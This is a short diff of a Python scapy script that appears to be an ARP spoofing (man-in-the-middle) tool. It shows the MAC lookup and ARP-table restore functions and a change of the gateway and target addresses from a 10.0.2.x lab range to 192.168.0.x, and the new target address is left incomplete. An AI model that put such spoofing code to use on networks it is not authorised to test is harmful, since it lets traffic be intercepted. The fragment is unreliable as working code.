@@ -3,6 +3,7 @@ import time
 
 import sys
 def get_mac(ip):
+  
 	
 	arp_header = scapy.ARP(pdst = ip)
 	ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -24,8 +25,8 @@ def restore(destination_ip,source_ip):
 	packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip)
         scapy.send(packet,count=4,verbose=False)
 
-gateway_ip="10.0.2.1"
-target_ip="10.0.2.7"
+gateway_ip="192.168.0.1"
+target_ip="192.168.0."
 try:
 	send_packets_counts=0
 	while True:
@@ -49,7 +50,6 @@ except KeyboardInterrupt:
 
 
 	
-
 
 
 
